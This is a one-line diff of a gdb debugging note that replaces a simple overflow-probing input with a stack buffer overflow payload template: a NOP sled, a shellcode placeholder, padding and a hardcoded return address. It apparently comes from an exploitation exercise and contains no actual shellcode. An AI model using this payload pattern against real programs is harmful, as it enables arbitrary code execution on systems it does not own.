@@ -1,1 +1,1 @@
-(gdb)run $(python2 -c "print 'A'*100 + 'B'*12 + 'C'*8 + 'D'*6") (gdb)info registers
+(gdb) run $(python2 -c "shellcode='<your_shellcode>'; print '\x90'*52 + shellcode + 'B'*12 + 'C'*8 + '\xe0\xe0\xff\xff\xff\x7f\x00\x00'")
